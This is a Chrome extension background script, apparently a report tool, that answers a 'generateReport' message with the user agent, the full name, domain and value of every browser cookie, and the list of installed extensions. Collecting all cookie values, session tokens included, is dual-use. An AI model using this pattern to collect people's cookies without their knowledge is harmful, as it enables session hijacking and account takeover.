chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "generateReport") {
      generateReport().then(report => sendResponse(report));
      return true; // Necesario para usar sendResponse de forma asíncrona
  }
});

async function generateReport() {
  let cookies = await getCookies();
  let extensions = await getExtensions();
  return JSON.stringify({
      browser: navigator.userAgent,
      cookies,
      extensions
  }, null, 2);
}

function getCookies() {
  return new Promise((resolve) => {
      chrome.cookies.getAll({}, (cookies) => {
          resolve(cookies.map(cookie => ({
              name: cookie.name,
              domain: cookie.domain,
              path: cookie.path,
              value: cookie.value,
              expirationDate: cookie.expirationDate || null
          })));
      });
  });
}

function getExtensions() {
  return new Promise((resolve) => {
      chrome.management.getAll((extensions) => {
          resolve(extensions.map(ext => ({
              name: ext.name,
              id: ext.id,
              enabled: ext.enabled,
              description: ext.description,
              version: ext.version
          })));
      });
  });
}
